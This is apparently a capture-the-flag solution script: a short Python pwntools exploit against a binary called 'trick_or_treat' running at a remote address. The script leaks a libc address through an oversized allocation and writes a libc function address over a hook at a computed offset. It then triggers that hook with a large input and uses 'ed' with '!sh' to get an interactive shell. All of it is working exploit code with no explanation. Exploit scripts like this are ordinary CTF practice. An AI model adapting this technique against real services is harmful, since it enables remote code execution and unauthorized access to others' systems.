from pwn import *

#r = process(["./trick_or_treat"])

r = remote("3.112.41.140", 56746)
r.sendlineafter(":",str(0x1000000))
r.recvuntil(":")
libc = int(r.recvline(),16)+0x1000ff0
print hex(libc)
offset = 0x1000ff0
r.sendlineafter(":",hex((offset+0x3ed8e8)/8))
r.sendline(" "+hex(libc+0x4f440))
r.sendafter(":","a"*0x400)
r.sendline("")
r.sendline("ed")
r.sendline("!sh")







r.interactive()
